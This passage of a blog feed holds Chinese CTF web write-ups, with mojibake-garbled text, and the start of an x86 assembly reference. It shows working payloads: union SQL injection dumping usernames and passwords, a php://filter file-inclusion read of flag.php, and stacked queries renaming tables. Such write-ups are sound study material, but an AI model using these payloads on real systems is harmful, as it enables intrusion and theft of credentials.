0,1)%23&amp;password=2Hello 2ï¼Your password is '</span>geekuser<span class="token string">'check.php?username='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Hello <span class="token number">2</span>ï¼Your password <span class="token operator">is</span> <span class="token string">'l0ve1ysq1'</span><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;password=2Hello 2ï¼Your password is '</span>geekuser<span class="token punctuation">,</span>l0ve1ysq1'<span class="token comment">//ä¸€æ­¥åˆ°ä½</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='</span>l0ve1ysq1<span class="token string">')%23&amp;password=2Hello 2ï¼Your password is '</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token string">'check.php?username='</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'geekuser'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">2</span>Hello <span class="token number">2</span>ï¼Your password <span class="token operator">is</span> <span class="token string">'id,username,password'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">check</span><span class="token punctuation">.</span>php?username<span class="token operator">=</span><span class="token string">' union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)%23&amp;password=2Hello 2ï¼Your password is '</span>cl4y<span class="token operator">~</span>wo_tai_nan_le<span class="token punctuation">,</span>glzjin<span class="token operator">~</span>glzjin_wants_a_girlfriend<span class="token punctuation">,</span>Z4cHAr7zCr<span class="token operator">~</span>biao_ge_dddd_hm<span class="token punctuation">,</span><span class="token number">0</span>xC4m3l<span class="token operator">~</span>linux_chuang_shi_ren<span class="token punctuation">,</span>Ayrain<span class="token operator">~</span>a_rua_rain<span class="token punctuation">,</span>Akko<span class="token operator">~</span>yan_shi_fu_de_mao_bo_he<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>cl4y<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_2_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_3_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_4_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_5_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_6_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_7_kuai_fu_ji<span class="token punctuation">,</span>fouc5<span class="token operator">~</span>di_8_kuai_fu_ji<span class="token punctuation">,</span>leixiao<span class="token operator">~</span>Syc_san_da_hacker<span class="token punctuation">,</span>flag<span class="token operator">~</span>Hello <span class="token number">2</span>ï¼Your password <span class="token operator">is</span> <span class="token string">'cl4y~wo_tai_nan_le,glzjin~glzjin_wants_a_girlfriend,Z4cHAr7zCr~biao_ge_dddd_hm,0xC4m3l~linux_chuang_shi_ren,Ayrain~a_rua_rain,Akko~yan_shi_fu_de_mao_bo_he,fouc5~cl4y,fouc5~di_2_kuai_fu_ji,fouc5~di_3_kuai_fu_ji,fouc5~di_4_kuai_fu_ji,fouc5~di_5_kuai_fu_ji,fouc5~di_6_kuai_fu_ji,fouc5~di_7_kuai_fu_ji,fouc5~di_8_kuai_fu_ji,leixiao~Syc_san_da_hacker,flag~flag{b68743d7-102c-415c-82f9-447bff55b3f6}'</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æå®¢å¤§æŒ‘æˆ˜_2019 Secret File</title>
      <link href="/2021/03/01/ji-ke-da-tiao-zhan-2019-secret-file/"/>
      <url>/2021/03/01/ji-ke-da-tiao-zhan-2019-secret-file/</url>
      
        <content type="html"><![CDATA[<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>æŸ¥çœ‹æºç </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>master<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./Archive_room.php<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value css language-css"><span class="token property">background-color</span><span class="token punctuation">:</span>#000000<span class="token punctuation">;</span><span class="token property">height</span><span class="token punctuation">:</span>70px<span class="token punctuation">;</span><span class="token property">width</span><span class="token punctuation">:</span>200px<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>black<span class="token punctuation">;</span><span class="token property">left</span><span class="token punctuation">:</span>44%<span class="token punctuation">;</span><span class="token property">cursor</span><span class="token punctuation">:</span>default<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>Oh! You found me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç‚¹å‡»è·³è½¬åˆ°<code>./Archive_room.php</code></p><p><img src="https://s3.ax1x.com/2021/03/03/6EyNLt.png" alt="6EyNLt.png"></p><p>ç‚¹å‡»secretï¼Œè·³è½¬</p><p><img src="https://s3.ax1x.com/2021/03/03/6Eywo8.png" alt="6Eywo8.png"></p><p>å›åˆ°åˆšæ‰é¡µé¢ï¼ŒæŠ“åŒ…çœ‹çœ‹</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">302</span> <span class="token reason-phrase string">Found</span></span><span class="token header"><span class="token header-name keyword">Server</span><span class="token punctuation">:</span> <span class="token header-value">openresty</span></span><span class="token header"><span class="token header-name keyword">Date</span><span class="token punctuation">:</span> <span class="token header-value">Wed, 24 Feb 2021 08:46:54 GMT</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/html; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Location</span><span class="token punctuation">:</span> <span class="token header-value">end.php</span></span><span class="token header"><span class="token header-name keyword">X-Powered-By</span><span class="token punctuation">:</span> <span class="token header-value">PHP/7.3.11</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">63</span></span>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;!--   secr3t.php        --&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹åˆ°é‡å®šå‘äº†</p><p>è¿›å…¥<code>secr3t.php </code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤äº†<code>../</code> <code>tp</code> <code>input</code> <code>data</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">payloadsecr3t<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è§£ç å¾—åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>               <span class="token keyword">echo</span> <span class="token string double-quoted-string">"æˆ‘å°±åœ¨è¿™é‡Œ"</span><span class="token punctuation">;</span>               <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag{c09a95d6-8ff9-4c3f-be29-20c8f10d75de}'</span><span class="token punctuation">;</span>               <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span>           <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯_2019 éšä¾¿æ³¨</title>
      <link href="/2021/03/01/qiang-wang-bei-2019-sui-bian-zhu/"/>
      <url>/2021/03/01/qiang-wang-bei-2019-sui-bian-zhu/</url>
      
        <content type="html"><![CDATA[<h2 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><p>è¾“å…¥â€™æŠ¥é”™</p><p><img src="https://s3.ax1x.com/2021/03/03/6Es8uq.gif" alt="6Es8uq.gif"></p><p>ç”¨order by æŸ¥å‡ºæœ‰ä¸¤ä¸ªå­—æ®µ</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsrK1.gif" alt="6EsrK1.gif"><img src="https://s3.ax1x.com/2021/03/03/6EsgUO.gif" alt="6EsgUO.gif"></p><p>è¿™é‡Œå‘ç°selectè¢«è¿‡æ»¤ï¼Œæˆ‘ç»•ä¸è¿‡</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsWPe.gif" alt="6EsWPe.gif"></p><p>è¯•äº†ä¸€ä¸‹èƒ½è¿›è¡Œå †å æ³¨å…¥</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsIKI.gif" alt="6EsIKI.gif"></p><p>æŸ¥åˆ°ä¸¤ä¸ªè¡¨ 1919810931114514ã€words</p><p>æŸ¥è¯¢è¡¨ä¸­åˆ—</p><p>?inject=â€™;show columns from <code>1919810931114514</code> %23</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsTqP.jpg" alt="6EsTqP.jpg"></p><p>?inject=â€™;show columns from <code>words</code> %23</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsHVf.jpg" alt="6EsHVf.jpg"></p><p>ç¦ç”¨äº†selectï¼Œå¯ä»¥é‡‡ç”¨é¢„ç¼–è¯‘æ¥çˆ†æ•°æ®</p><p>è¿™é‡Œå­˜åœ¨å¤§å°å†™ç»•è¿‡</p><p><img src="https://s3.ax1x.com/2021/03/03/6EsOPg.gif" alt="6EsOPg.gif"></p><p><img src="https://s3.ax1x.com/2021/03/03/6Esj2j.gif" alt="6Esj2j.gif"></p><p>alter table words rename to words1;alter table <code>1919810931114514</code> rename to words;alter table words change flag id varchar(50);#</p><p>è¿™ç§æ˜¯çŒœæµ‹é»˜è®¤æŸ¥wordsä¸­çš„æ•°æ®</p><p>æ­¤payloadæ˜¯å°†wordsæ”¹ä¸ºwords1ï¼Œå°†1919810931114514æ”¹ä¸ºwordsï¼Œå°†å…¶ä¸­æ•°æ®åˆ—ä¹Ÿæ”¹ä¸ºid varcharï¼ˆ50ï¼‰</p><p>å†é€šè¿‡â€™ or 1=1æŸ¥å…¨éƒ¨æ•°æ®</p><p><img src="https://s3.ax1x.com/2021/03/03/6EySrq.gif" alt="6EySrq.gif"></p><p><img src="https://s3.ax1x.com/2021/03/03/6EyPaT.gif" alt="6EyPaT.gif"></p><p>è¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> BUUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Training_WWW_Robots</title>
      <link href="/2021/02/01/training-www-robots/"/>
      <url>/2021/02/01/training-www-robots/</url>
      
        <content type="html"><![CDATA[<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>è¿›å»å°±æœ‰æç¤º</p><p>robots.txtæ–‡ä»¶æ˜¯ä¸ºäº†å‘Šè¯‰çˆ¬è™«ç¨‹åºæˆ–è€…æœç´¢å¼•æ“å“ªäº›èµ„æºä¸èƒ½çˆ¬ï¼Œä½ å°±å¯ä»¥ä»è¿™äº›èµ„æºä¸­æ‰¾åˆ°ä½ è¦ç”¨çš„,ç„¶åè¿›è¡Œä½ çš„æ“ä½œ</p><p><img src="https://s3.ax1x.com/2021/03/03/6ErLcR.png" alt="6ErLcR.png"></p><p><img src="https://s3.ax1x.com/2021/03/03/6ErvB6.png" alt="6ErvB6.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> æ”»é˜²ä¸–ç•Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>baby_web</title>
      <link href="/2021/02/01/baby-web/"/>
      <url>/2021/02/01/baby-web/</url>
      
        <content type="html"><![CDATA[<h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><p>æ ¹æ®æç¤º åˆå§‹é¡µé¢ å¯ä»¥æƒ³åˆ°indexï¼ˆå¤§éƒ¨åˆ†æ­£å¸¸ç½‘ç«™éƒ½æ˜¯indexï¼‰å°è¯•å°†urlæ”¹ä¸ºindex.phpï¼Œå‘ç°è·³è½¬åˆ°äº†1.phpï¼Œè¯´æ˜è¢«é‡å®šå‘äº†</p><p>ç¬¬ä¸€ç§æ–¹æ³•ï¼Œæµè§ˆå™¨ä¸­F12æ‰“å¼€é¢æ¿ï¼Œåœ¨ç½‘ç»œæ¨¡å—å¯ä»¥å‘ç°flag</p><p><img src="https://s3.ax1x.com/2021/03/03/6ED3Gj.png" alt="6ED3Gj.png"></p><p>ç¬¬äºŒç§ç›´æ¥ç”¨bpæŠ“åŒ…ï¼ŒæŸ¥çœ‹å“åº”å¤´flag</p><p><img src="https://s3.ax1x.com/2021/03/03/6EDNLV.png" alt="6EDNLV.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> æ”»é˜²ä¸–ç•Œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çˆ†ç ´-1</title>
      <link href="/2021/02/01/bao-po-1/"/>
      <url>/2021/02/01/bao-po-1/</url>
      
        <content type="html"><![CDATA[<h2 id="çˆ†ç ´-1"><a href="#çˆ†ç ´-1" class="headerlink" title="çˆ†ç ´-1"></a>çˆ†ç ´-1</h2><p>è¿›å»åå¦‚ä¸‹ä»£ç æç¤º</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude "flag.php";$a = @$_REQUEST['hello'];if(!preg_match('/^\w*$/',$a )){  die('ERROR');}eval("var_dump($$a);");show_source(__FILE__);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>$_REQUEST[â€˜helloâ€™]</p><p>æäº¤çš„å‚æ•°æ˜¯helloï¼Œå‰é¢æç¤ºåœ¨æŸä¸ª6ä½å˜é‡ä¸­ï¼Œæƒ³åˆ°çˆ†ç ´ï¼Œä½†æ˜¯å·¥ä½œé‡å¾ˆå¤§</p><p>/^\w*$/ </p><p>^n   ä»¥nå¼€å¤´</p><p>n$  ä»¥nç»“å°¾</p><p>n*  åŒ¹é…0ä¸ªæˆ–è€…å¤šä¸ªn</p><p>\w  æŸ¥æ‰¾å•è¯å­—ç¬¦  A_Z  a_z  0_9  _</p><p>æ­£åˆ™è¿‡æ»¤åçˆ†ç ´è¿˜æ˜¯å¾ˆå¤§çš„å·¥ä½œé‡</p><p>eval(â€œvar_dump($$a);â€)</p><p>eavl()æ˜¯ä»£ç æ‰§è¡Œå‡½æ•°ï¼Œ</p><p>var_dump() å‡½æ•°å°†å˜é‡çš„ç±»å‹ã€å€¼ã€ç»“æ„ç­‰ä¿¡æ¯æ‰“å°å‡ºæ¥</p><p>è¿™é‡Œå°±å¯ä»¥æ˜¯ç”¨å…¨å±€å˜é‡$GLOBALSå°†æ‰€æœ‰å˜é‡æ‰“å°å‡ºæ¥</p><p><img src="https://s3.ax1x.com/2021/03/03/6EyMdK.png" alt="6EyMdK.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>32ä½æ±‡ç¼–æŒ‡ä»¤æ€»ç»“(ä»£ç ç¤ºä¾‹)</title>
      <link href="/2021/01/03/zhi-ling/"/>
      <url>/2021/01/03/zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="é€šç”¨æ•°æ®ä¼ é€æŒ‡ä»¤"><a href="#é€šç”¨æ•°æ®ä¼ é€æŒ‡ä»¤" class="headerlink" title="é€šç”¨æ•°æ®ä¼ é€æŒ‡ä»¤"></a>é€šç”¨æ•°æ®ä¼ é€æŒ‡ä»¤</h1><h3 id="MOV-ä¼ é€å­—æˆ–å­—èŠ‚"><a href="#MOV-ä¼ é€å­—æˆ–å­—èŠ‚" class="headerlink" title="MOV ä¼ é€å­—æˆ–å­—èŠ‚"></a>MOV ä¼ é€å­—æˆ–å­—èŠ‚</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">mov al,10h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MOVSX-å…ˆç¬¦å·æ‰©å±•-å†ä¼ é€"><a href="#MOVSX-å…ˆç¬¦å·æ‰©å±•-å†ä¼ é€" class="headerlink" title="MOVSX å…ˆç¬¦å·æ‰©å±•,å†ä¼ é€"></a>MOVSX å…ˆç¬¦å·æ‰©å±•,å†ä¼ é€</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">movsx eax,ax;å…ˆè¿›è¡Œå…¨é›¶æ‰©å±•,å‰16ä½ä¸ºF<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MOVZX-å…ˆé›¶æ‰©å±•-å†ä¼ é€"><a href="#MOVZX-å…ˆé›¶æ‰©å±•-å†ä¼ é€" class="headerlink" title="MOVZX å…ˆé›¶æ‰©å±•,å†ä¼ é€"></a>MOVZX å…ˆé›¶æ‰©å±•,å†ä¼ é€</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">movzx eax,ax;å…ˆè¿›è¡Œå…¨é›¶æ‰©å±•,å‰16ä½ä¸º0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSH-æŠŠå­—å‹å…¥å †æ ˆ"><a href="#PUSH-æŠŠå­—å‹å…¥å †æ ˆ" class="headerlink" title="PUSH æŠŠå­—å‹å…¥å †æ ˆ"></a>PUSH æŠŠå­—å‹å…¥å †æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">push reg/nem16   32push imm32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="POP-æŠŠå­—å¼¹å‡ºå †æ ˆ"><a href="#POP-æŠŠå­—å¼¹å‡ºå †æ ˆ" class="headerlink" title="POP æŠŠå­—å¼¹å‡ºå †æ ˆ"></a>POP æŠŠå­—å¼¹å‡ºå †æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pop reg/nem16  32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSHFD-æŠŠ32EFLAGSå¯„å­˜å™¨å†…å®¹å‹å…¥å †æ ˆ"><a href="#PUSHFD-æŠŠ32EFLAGSå¯„å­˜å™¨å†…å®¹å‹å…¥å †æ ˆ" class="headerlink" title="PUSHFD æŠŠ32EFLAGSå¯„å­˜å™¨å†…å®¹å‹å…¥å †æ ˆ"></a>PUSHFD æŠŠ32EFLAGSå¯„å­˜å™¨å†…å®¹å‹å…¥å †æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pushfd;ä¿å­˜æ ‡å¿—å¯„å­˜å™¨å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPFD-æŠŠ32EFLAGSå¯„å­˜å™¨å†…å®¹å¼¹å‡ºå †æ ˆ"><a href="#POPFD-æŠŠ32EFLAGSå¯„å­˜å™¨å†…å®¹å¼¹å‡ºå †æ ˆ" class="headerlink" title="POPFD æŠŠ32EFLAGSå¯„å­˜å™¨å†…å®¹å¼¹å‡ºå †æ ˆ"></a>POPFD æŠŠ32EFLAGSå¯„å­˜å™¨å†…å®¹å¼¹å‡ºå †æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popfd;æ¢å¤æ ‡å¿—å¯„å­˜å™¨å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSHA-æŠŠAX-CX-DX-BX-SP-BP-SI-DIä¾æ¬¡å‹å…¥å †æ ˆ"><a href="#PUSHA-æŠŠAX-CX-DX-BX-SP-BP-SI-DIä¾æ¬¡å‹å…¥å †æ ˆ" class="headerlink" title="PUSHA æŠŠAX,CX,DX,BX,SP,BP,SI,DIä¾æ¬¡å‹å…¥å †æ ˆ"></a>PUSHA æŠŠAX,CX,DX,BX,SP,BP,SI,DIä¾æ¬¡å‹å…¥å †æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pusha;ä¿å­˜16é€šç”¨å¯„å­˜å™¨å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPA-æŠŠDI-SI-BP-SP-BX-DX-CX-AXä¾æ¬¡å¼¹å‡ºå †æ ˆ"><a href="#POPA-æŠŠDI-SI-BP-SP-BX-DX-CX-AXä¾æ¬¡å¼¹å‡ºå †æ ˆ" class="headerlink" title="POPA æŠŠDI,SI,BP,SP,BX,DX,CX,AXä¾æ¬¡å¼¹å‡ºå †æ ˆ"></a>POPA æŠŠDI,SI,BP,SP,BX,DX,CX,AXä¾æ¬¡å¼¹å‡ºå †æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popa;æ¢å¤16é€šç”¨å¯„å­˜å™¨å†…å­˜<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PUSHAD-æŠŠEAX-ECX-EDX-EBX-ESP-EBP-ESI-EDIä¾æ¬¡å‹å…¥å †æ ˆ"><a href="#PUSHAD-æŠŠEAX-ECX-EDX-EBX-ESP-EBP-ESI-EDIä¾æ¬¡å‹å…¥å †æ ˆ" class="headerlink" title="PUSHAD æŠŠEAX,ECX,EDX,EBX,ESP,EBP,ESI,EDIä¾æ¬¡å‹å…¥å †æ ˆ"></a>PUSHAD æŠŠEAX,ECX,EDX,EBX,ESP,EBP,ESI,EDIä¾æ¬¡å‹å…¥å †æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">pushad;ä¿å­˜32é€šç”¨å¯„å­˜å™¨å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="POPAD-æŠŠEDI-ESI-EBP-ESP-EBX-EDX-ECX-EAXä¾æ¬¡å¼¹å‡ºå †æ ˆ"><a href="#POPAD-æŠŠEDI-ESI-EBP-ESP-EBX-EDX-ECX-EAXä¾æ¬¡å¼¹å‡ºå †æ ˆ" class="headerlink" title="POPAD æŠŠEDI,ESI,EBP,ESP,EBX,EDX,ECX,EAXä¾æ¬¡å¼¹å‡ºå †æ ˆ"></a>POPAD æŠŠEDI,ESI,EBP,ESP,EBX,EDX,ECX,EAXä¾æ¬¡å¼¹å‡ºå †æ ˆ</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">popad;æ¢å¤32é€šç”¨å¯„å­˜å™¨å†…å­˜<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="BSWAP-äº¤æ¢32ä½å¯„å­˜å™¨é‡Œå­—èŠ‚çš„é¡ºåº"><a href="#BSWAP-äº¤æ¢32ä½å¯„å­˜å™¨é‡Œå­—èŠ‚çš„é¡ºåº" class="headerlink" title="BSWAP äº¤æ¢32ä½å¯„å­˜å™¨é‡Œå­—èŠ‚çš„é¡ºåº"></a>BSWAP äº¤æ¢32ä½å¯„å­˜å™¨é‡Œå­—èŠ‚çš„é¡ºåº</h3><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">;EAX=96688368HBSWAP EAX;EAX=68836896H<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="XCHG-äº¤æ¢å­—æˆ–å­—èŠ‚-è‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºå¯„å­˜å™¨-æ®µå¯„å­˜å™¨ä¸å¯ä½œä¸ºæ“ä½œæ•°"><a href="#XCHG-äº¤æ¢å­—æˆ–å­—èŠ‚-è‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºå¯„å­˜å™¨-æ®µå¯„å­˜å™¨ä¸å¯ä½œä¸ºæ“ä½œæ•°" class="headerlink" title="XCHG äº¤æ¢å­—æˆ–å­—èŠ‚( è‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºå¯„å­˜å™¨,æ®µå¯„å­˜å™¨ä¸å¯ä½œä¸ºæ“ä½œæ•°)"></a>XCHG äº¤æ¢å­—æˆ–å­—èŠ‚( 